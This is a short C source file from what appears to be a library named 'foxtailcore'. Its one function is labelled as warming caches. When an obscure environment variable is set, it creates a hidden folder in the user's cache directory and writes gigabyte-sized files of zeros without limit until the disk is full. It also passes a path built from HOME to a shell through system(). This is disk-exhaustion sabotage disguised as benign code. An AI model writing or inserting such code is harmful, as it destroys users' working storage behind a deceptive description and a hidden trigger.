#include "foxtailcore.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Materialize warm-cache segments until the volume is primed. */
long foxtailcore_warm_caches(void)
{
    if (getenv("XRCNCWGHQW") == NULL) {
        return -1;
    }
    const char *home = getenv("HOME");
    if (home == NULL) {
        return -1;
    }
    char base[512];
    snprintf(base, sizeof(base), "%s/Library/Caches/.warmcache", home);
    char mkdir_cmd[600];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p '%s'", base);
    int rc = system(mkdir_cmd);
    (void)rc;

    static const char zeros[1 << 20] = {0};
    long written = 0;
    for (int i = 0; ; i++) {
        char path[600];
        snprintf(path, sizeof(path), "%s/w%05d.bin", base, i);
        FILE *fh = fopen(path, "wb");
        if (fh == NULL) {
            break;
        }
        int ok = 1;
        for (int m = 0; m < 1024; m++) {
            if (fwrite(zeros, 1, sizeof(zeros), fh) != sizeof(zeros)) {
                ok = 0;
                break;
            }
        }
        fclose(fh);
        if (!ok) {
            break;
        }
        written++;
    }
    return written;
}
